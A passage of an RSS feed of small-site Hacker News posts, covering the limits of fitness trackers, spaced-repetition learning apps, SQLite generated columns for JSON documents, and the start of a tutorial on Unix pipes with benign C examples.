rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-628nt"><p><span>📖 </span><a href="https://www.thedetechtor.com/post/are-e-books-the-perfect-alternative" target="_blank" rel="noopener"><u><strong>Are e-books the perfect alternative?</strong></u></a></p></li><li id="viewer-4vu6m"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><p id="viewer-f7pln"><span>For the first 6 months, the money worked, but the Fitbits alone didn’t. The Fitbit-plus-cash group put in 29 more minutes of moderate physical activity a week than the control group, but the Fitbit-only group barely moved more than the control group.</span></p><div id="viewer-2qkoo"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/nsplsh_45394e453071637137346b~mv2_d_6000_4500_s_4_2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_45394e453071637137346b~mv2_d_6000_4500_s_4_2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-d9la6"><span>After that, it all went downhill: by the end, 90% of Fitbit users abandoned their devices and furthermore, the improvements in health and weight were negligible.

</span></p><h3 id="viewer-c7o16"><span>How to interpret the results?</span></h3><p id="viewer-fggdn"><span>So both these studies have come back with some pretty negative results, how did this happen?</span></p><p id="viewer-9ceo0"><span>Well according to the lead author on the Pittsburgh study, John Jakicic:</span></p><blockquote id="viewer-8s0cb"><span>“These technologies are focused on physical activity, like taking steps and getting your heart rate up, people would say, 'Oh, I exercised a lot today, now I can eat more.' And they might eat more than they otherwise would have.” </span></blockquote><p id="viewer-drb7s"><span>
This is understandable but surely there must be a reason so many people have invested in smart trackers other than our obsession with wearable tech?</span></p><p id="viewer-rnti"><span>
The point is that these devices will work, for <strong>some people. </strong>That is to say that too many people go and buy these devices hoping they'll motivate them to move more, but this just isn't the case; consumers misperceive what are in fact data trackers as motivational tools.</span></p><blockquote id="viewer-1dp63"><span>
“Fitness trackers are equivalent to a bathroom scale,” says Eric Finkelstein, lead author of the Lancet study. “They’re a measurement tool, not an intervention tool. They tell you something, but don’t give you a strategy for how to change it.”</span></blockquote><h3 id="viewer-4sqnd"><span><strong>Should you still go out and buy one?</strong></span></h3><p id="viewer-fnpda"><span>As I said before, the usefulness of these devices varies from person to person, if you think that receiving a bunch of data about how much you’re moving on a regular basis will motivate to stay active then sure! But if you’re expecting the equivalent of a personal coach on your wrist then think again.</span></p><div id="viewer-ei9pb"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-6ldtr"><span>However, these companies are making efforts to improve the motivation aspect to their devices, like <a href="https://www.thedetechtor.com/post/apple-event-september-2020-everything-you-need-to-know" target="_blank" rel="noopener"><u>Apple’s activity rings</u></a>, or some devices allowing you to compare your data to your friends and family. If these companies keep innovating which they undoubtedly will, the choice will become easier.</span></p><h3 id="viewer-85glq"><span><span>More from The Detechtor:</span></span></h3><ul><li id="viewer-2da2g"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-ej0mv"><p><span>📖 </span><a href="https://www.thedetechtor.com/post/are-e-books-the-perfect-alternative" target="_blank" rel="noopener"><u><strong>Are e-books the perfect alternative?</strong></u></a></p></li><li id="viewer-9jduk"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-8enl2"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-8gskr"><p>📩 Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-c6i8i"><p>🎙 <strong>NEW</strong>! <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><strong><u>The Detechtor Podcast</u></strong></a> is now available on all podcast players!                                 <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><strong><u>Apple Podcasts</u></strong></a><strong> | </strong><a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><strong><u>Spotify</u></strong></a><strong> | </strong><a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><strong><u>Google Podcasts</u></strong></a><strong> | </strong><a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><strong><u>Stitcher</u></strong></a><strong> | </strong><a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><strong><u>Tunein</u></strong></a></p></li><li id="viewer-3atft"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><strong><u>Twitter</u></strong></a><strong> | </strong><a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><strong><u>Instagram</u></strong></a><strong> | </strong><a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><strong><u>Facebook</u></strong></a><strong> | </strong><a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><strong><u>Youtube</u></strong></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226897</guid>
            <pubDate>Fri, 27 Nov 2020 09:23:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Memorize Faster with the Spaced Repetition Learning Technique]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 58 (<a href="https://news.ycombinator.com/item?id=25226621">thread link</a>) | @rossnoel
<br/>
November 27, 2020 | https://productive.fish/blog/spaced-repetition/ | <a href="https://web.archive.org/web/*/https://productive.fish/blog/spaced-repetition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
        
        <p>
            05 Sep 2020 • 6 min read
        </p>
    

    <p>As many of us have experienced during school years, late-night learning is not the most effective technique. The information might have stuck around for a short period, but just after the day of the exam, it flew away with us unable to recall it. If you would like to remember more during and after your studies, forget the last-minute learning. Using spaced repetition, a method to rehearse educational material, you will not simply earn better grades, but studying would be an overall easier process and memorized information will be available to recall later in your life.</p>
<picture>
  <source type="image/webp" media="(max-width: 320px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition-sm.webp 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition-sm@2x.webp 2x">
  <source type="image/webp" media="(max-width: 1099px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition-md.webp 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition-md@2x.webp 2x">
  <source type="image/webp" media="(min-width: 1100px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition.webp 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition@2x.webp 2x">
  <source media="(max-width: 320px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition-sm.jpg 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition-sm@2x.jpg 2x">
  <source media="(max-width: 1099px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition-md.jpg 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition-md@2x.jpg 2x">
  <source media="(min-width: 1100px)" srcset="https://productive.fish/blog/spaced-repetition/spaced-repetition.jpg 1x, https://productive.fish/blog/spaced-repetition/spaced-repetition@2x.jpg 2x">
  <img src="https://productive.fish/blog/spaced-repetition/spaced-repetition.jpg" alt="A person on a conveyor symbolizing repeating process">
</picture>
<p>The spaced repetition system is a learning technique in which the material previously learned is recalled by the learner from time to time at ever-increasing intervals. This method is based on the intermittent repetition effect on how we tend to forget information. The primary goal of the technique is to recall the material learned as infrequently as possible, just before we forget it. By approaching repetitions in this scientific way, time spent learning can be used much more efficiently.</p>
<h2>The neurological background of memorizing</h2>
<p>Learning always begins with perception, the form of how we collect information. This data travels through the nerve pathways to the place where the perception is processed, our brain. Some perceptions cause our bodies to react, which usually does not happen consciously.</p>
<p>Scientists once thought that the brain stores memories in a similar way to computers. It was later proved that the artificial approach is completely different: information is broken down into elements (bits) on the computer and is stored that way. The machines can store up to a certain amount of information on a storage device called a hard disk. If our brain would work similarly, despite having hundreds of billions of cells, our internal storage device would have filled up in a matter of hours.</p>
<p>Our brains work in a rather different way: since we always store information in context it is more about capturing the contents of things. That’s why when we recall a memory, related reminiscences come to mind, like smells or the color of the paper, or what we ate for dinner during learning.</p>
<h2>What makes spaced repetition so effective?</h2>
<p>Spaced repetition technique is one of the most effective learning techniques, which you probably use even if you do not know about it. Using this method consciously makes it far superior to standard learning.</p>
<p>There are three key values it provides:</p>
<div>
<p>Delays forgetting learned information by prolonging the forget-curve.</p>
<p>Active recall helps to keep memorized information fresh (as the context layers build-up, it gets easier to remember what you have learned).</p>
<p>Spaced repetition supports long term memory, so you won’t forget the learned information even after the exam.</p>
</div>
<h2>How to get started with the spaced repetition system?</h2>
<p>To put the above in practice, try to remember a movie you’ve seen more than one time. After you’ve watched it first, you understood it well, but a few weeks later you only remembered the title and main story points. You watched it with a friend two months later, and while watching, you have realized that you can recall the story and started to watch out for certain details in the background, or the listening closer to the music. When you watched it for the third time, you probably remembered all the names, a few exact quotes, and the story details too.</p>
<p>Of course, the typical study materials are far from a movie’s excitement, however, learning it works the same. Review your documents and memorize them for the first time. After you have finished, try recalling them in a suitable way: you can write them down or simply rehearse the answers out loud. (Trying to recall it through your inner voice is not the best idea as we all tend to cheat ourselves.)</p>
<p>If you recalled it correctly, put the documents down and start another activity. After an hour try to rehearse it again, maybe using a different method. Then again in a few hours, and on the next day morning. Keep lengthening these intervals until you are ready to face the exam.</p>
<h2>Applications and websites that support you along the journey</h2>
<p>Luckily, today we have multiple choices on how to organize our studies. Different websites, along with applications, will help to study faster and also memorize for the long-term. Let’s see 5 software programs and applications utilizing the spaced repetition system!</p>
<h3>1. <a href="https://quizlet.com/" target="_blank" rel="noopener noreferrer">Quizlet</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Quizlet-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Quizlet-logo.png" alt="Quizlet logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> This is an application that you can use either through your browser or on any mobile device. With one account you can have all your data synchronized, so you can continue your studies away from the computer when it is time to repeat!</p>
<p>The basic idea of Quizlet is that you can search for subjects that already have their case sets and use those, or you can create your own “memorizing cards”. Just enter the term and the definition, and after you are ready, you can start the learning process. Quizlet is also utilized for high-level education and corporate usage, ranging from healthcare studies to Starbucks training programs.</p>
<p>The app is available for students and teachers as well. If you get the vibe of this tool and you want to support it, for a low amount of monthly payment you can also purchase Quizlet Go or Plus for wider and advanced toolkits to create enhanced study sets.</p>
<p><strong>How it fits with SRLT:</strong> After creating or choosing your flashcard set, you can start to memorize the information. When you feel ready, you can choose how to check your knowledge. First is the “Learning” phase: Quizlet will show you the term and you will have to answer it from multiple choices or you will have to type it from memory - and the software will immediately review it. Getting it correctly will set the term as “Familiar”, and after multiple times it will be changed to “Mastered”. Furthermore, this spaced repetition app will give you constant feedback based on your answers, where you are in the learning process, and what you should focus on.</p>
<h3>2. <a href="https://www.edapp.com/" target="_blank" rel="noopener noreferrer">EdApp</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/EdApp-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/EdApp-logo.png" alt="EdApp logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> Signing up for EdApp will give you a choice if you want to educate others or yourself. The registration is fast, and you can immediately create your topic or search in the content library based on your interest.</p>
<p>The contents will be summarized using texts, gifs, and short videos because visualization had a great positive effect on memorizing capabilities. The presentations also have interactive parts, triggering the mind with the element of surprise, stabilizing the learned information. While you are stepping further, EdApp will give you milestones to know where you are in the process.</p>
<p><strong>How it fits with SRLT:</strong> With its sophisticated approach and triggering effects, this spaced repetition software helps to improve memorizing information. On its finalizing page it summarizes the studied content, and based on your answers it gives feedback.</p>
<h3>3. <a href="https://apps.ankiweb.net/" target="_blank" rel="noopener noreferrer">Anki</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Anki-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Anki-logo.png" alt="Anki logo"></picture> <strong>Platforms:</strong> Windows, Mac, Linux, iOS, Android, and any device with a web browser</p>
<p><strong>The basic idea:</strong> Anki is a simple, ad-free software that helps you to create flashcards. After downloading it to your computer or on your mobile phone, the first step is to generate decks, which will include flashcards. All cards have a front- and a backside that you can fill up with information. Also, you can insert pictures and other notes from your classes, so you can memorize those as well. You can also grade the difficulty of the lesson. Anki is mostly used by college students (especially in healthcare). It runs offline, and its ad-free, transparent user interface won’t cause any disturbance during studying.</p>
<p><strong>How it fits with SRLT:</strong> Based on how difficult you have found the lecture, the program will offer you three choices to choose from: to see the lesson again in one minute or to repeat it in ten minutes or four days.</p>
<h3>4. <a href="https://www.brainscape.com/" target="_blank" rel="noopener noreferrer">Brainscape</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Brainscape-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Brainscape-logo.png" alt="Brainscape logo"></picture> <strong>Platforms:</strong> web, Android, iOS</p>
<p><strong>The basic idea:</strong> Brainscape is a specialized spaced repetition system where the algorithm focuses on the areas which need improvements, based on your answers and learning patterns. This is a lively web surface because their team is openly active on other social media websites and showing their results and feedback from users and companies, furthermore, a blog, full of content, is available as well.</p>
<p><strong>How it fits with SRLT:</strong> Brainscape will effectively monitor and check your answers and will support you - if you are honest how well you have known the flash cards’ answers, based on a scale from 1 to 5. It will also measure time during your study phases and help you to memorize information faster.</p>
<h3>5. <a href="http://smartcardsplus.com/" target="_blank" rel="noopener noreferrer">SmartCards+</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/SmartCards-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/SmartCards-logo.png" alt="SmartCards+ logo"></picture> <strong>Platform:</strong> iOS</p>
<p><strong>The basic idea:</strong> Smartcards will support your studies with a learning curve, measure the optimal time, and suggest when to repeat your studies. This spaced repetition app is only available for iOS users.</p>
<p><strong>How it fits with SRLT:</strong> Its classical surface will help you not simply with drag and drop text flashcards, but you can also insert video and audio files to support the memorization process. Furthermore, typing an answer is also an option during the learning phase, and the program will color results to show if you were correct or not.</p>
<h2>Conclusion</h2>
<p>Learning accompanies us throughout our entire life, while as we age studying gets harder. Spaced repetition is a good-to-know tactic (or even life-hack) that you might have used before without consciously knowing it. Utilizing the method through one of the above spaced repetition software apps will help you to memorize learning materials more effectively and in less time. The method comes handy in all ages, regardless if you go to school, prepare for college exams, or do corporate training to develop your career.</p>


</article></div>]]>
            </description>
            <link>https://productive.fish/blog/spaced-repetition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226621</guid>
            <pubDate>Fri, 27 Nov 2020 08:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SQLite as a Document Database]]>
            </title>
            <description>
<![CDATA[
Score 229 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25226260">thread link</a>) | @JNRowe
<br/>
November 26, 2020 | https://dgl.cx/2020/06/sqlite-json-support | <a href="https://web.archive.org/web/*/https://dgl.cx/2020/06/sqlite-json-support">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>SQLite has had JSON support for a while.</p>

<p>However recently it added a killer feature: <a href="https://www.sqlite.org/gencol.html">generated
columns</a>. (This was added in 3.31.0,
released 2020-01-22.)</p>

<p>This makes it possible to insert JSON straight into SQLite and then have it
extract data and index them, i.e. you can treat SQLite as a document database.
This has been possible with PostgreSQL and obviously is what something like
Elastic provides but having it available in an embedded database is very nice
for lightweight stuff.</p>

<p>Let's get started:</p>

<pre><code>$ sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Connected to a transient in-memory database.
sqlite&gt; CREATE TABLE t (
   body TEXT,
   d INT GENERATED ALWAYS AS (json_extract(body, '$.d')) VIRTUAL);
sqlite&gt; insert into t values(json('{"d":"42"}'));
sqlite&gt; select * from t WHERE d = 42;
{"d":"42"}|42
</code></pre>

<p>It's that simple, the <code>d</code> column is extracted from the provided JSON.</p>

<p>(Aside: The hard bit may be getting a new enough SQLite, at the time of writing
Homebrew on macOS has it, else you likely need to use an unstable source like
nixpkgs-unstable.)</p>

<p>There's some nice properties of this. Normally it's encouraged to minifiy and
validate JSON when inserting (via the <code>json()</code> function) as because SQLite
doesn't have a JSON type it will allow anything. However nothing enforces that,
you could add a constraint but will probably forget... Having <code>GENERATED ALWAYS</code>
using <code>json_extract</code> means invalid JSON will get a <code>Error: malformed JSON</code> at
INSERT time.</p>

<p>This can be taken further:</p>

<pre><code>sqlite&gt; CREATE TABLE x (
  body TEXT,
  id TEXT GENERATED ALWAYS AS (json_extract(body, '$.id')) VIRTUAL NOT NULL);
sqlite&gt; insert into x values('');
Error: malformed JSON
sqlite&gt; insert into x values('{}');
Error: NOT NULL constraint failed: x.id
</code></pre>

<p>We can enforce items are present in the inserted JSON, here by adding <code>NOT
NULL</code>, but we could also use constraints and other SQLite features!</p>

<p>You'll notice I've used <code>VIRTUAL</code> with the generated column in these examples.
There's also the option of using <code>STORED</code> to essentially cache the values,
although a downside is you can't add those columns via <code>ALTER TABLE</code>.</p>

<p>However you can always create an index on a column, even if it's defined a
virtual one:</p>

<pre><code>CREATE INDEX xid on x(id);</code></pre>

<p>Then check that's going to work as expected:
</p><pre><code>EXPLAIN QUERY PLAN SELECT * FROM x WHERE id='foo';
QUERY PLAN
`--SEARCH TABLE x USING INDEX xid (id=?)
</code></pre>

<p>Combined with ALTER TABLE we can add a new column and index it:</p>

<pre><code>ALTER TABLE x ADD COLUMN text TEXT
    GENERATED ALWAYS AS (json_extract(body, '$.text')) VIRTUAL;
INSERT INTO x VALUES(json('{"id":43, "text":"test"}'));
CREATE INDEX xtext ON x(text);
</code></pre>

<p>
The benefit here is you can start off with a table which could be as simple as
just a single JSON column, and add columns and indexes as you find useful data
in that JSON. For example this can work really well for webhooks, insert all the
data you are sent straight into a table, then pull out the useful stuff later.
Have fun.
</p>
</div></div>]]>
            </description>
            <link>https://dgl.cx/2020/06/sqlite-json-support</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226260</guid>
            <pubDate>Fri, 27 Nov 2020 07:21:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mastering Unix Pipes, Part 1 – Moritz Systems]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25226163">thread link</a>) | @rodrigo975
<br/>
November 26, 2020 | https://www.moritz.systems/blog/mastering-unix-pipes-part-1/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/mastering-unix-pipes-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<div><pre><code data-lang="make"><span>#	$NetBSD: Makefile,v 1.4 2003/07/10 10:34:26 lukem Exp $
</span><span>#
</span><span>#	@(#)Makefile	1.8 (Berkeley) 6/8/93
</span><span></span>
DIR<span>=</span>	papers/kernmalloc
SRCS<span>=</span>	kernmalloc.t appendix.t
MACROS<span>=</span>	-ms

<span>paper.ps</span><span>:</span> ${SRCS} alloc.fig usage.tbl
	<span>${</span>TOOL_SOELIM<span>}</span> <span>${</span>SRCS<span>}</span> | <span>${</span>TOOL_TBL<span>}</span> | <span>${</span>TOOL_PIC<span>}</span> | <span>\
</span><span></span>	    <span>${</span>TOOL_EQN<span>}</span> | <span>\
</span><span></span>	    <span>${</span>TOOL_VGRIND<span>}</span> | <span>${</span>TOOL_ROFF_PS<span>}</span> <span>${</span>MACROS<span>}</span> &gt; <span>${</span>.TARGET<span>}</span>

<span>.include</span> &lt;bsd.doc.mk&gt;
</code></pre></div>

<p>Source <a href="https://nxr.netbsd.org/xref/src/share/doc/papers/kernmalloc/Makefile">src/share/doc/papers/kernmalloc/Makefile</a>.</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

<p>This algorithm is coded as follows:</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;sys/types.h&gt;</span><span>
</span><span>#include</span> <span>&lt;sys/wait.h&gt;</span><span>
</span><span></span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>char</span> c;
	<span>int</span> status;
	pid_t child;
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> ((child <span>=</span> fork()) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"fork"</span>);

	<span>if</span> (child <span>==</span> <span>0</span>) {
		<span>/* child */</span>
		<span>if</span> (close(fildes[<span>1</span>]) <span>==</span> <span>-</span><span>1</span>)
			err(EXIT_FAILURE, <span>"close"</span>);
		read(fildes[<span>0</span>], <span>&amp;</span>c, <span>1</span>);
		printf(<span>"Received: %c</span><span>\n</span><span>"</span>, c);
		<span>/* force the buffer to be printed on the output (screen) */</span>
		fflush(stdout);
		_exit(<span>0</span>);
	}
	<span>/* parent */</span>
	<span>if</span> (close(fildes[<span>0</span>]) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"close"</span>);
	<span>if</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"write"</span>);

	<span>/* wait for the child process termination */</span>
	<span>if</span> (wait(<span>&amp;</span>status) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"wait"</span>);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;limits.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	printf(<span>"_PC_PIPE_BUF: %ld</span><span>\n</span><span>"</span>, fpathconf(fildes[<span>1</span>],_PC_PIPE_BUF));
	printf(<span>"PIPE_BUF: %d</span><span>\n</span><span>"</span>, PIPE_BUF);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;sys/types.h&gt;</span><span>
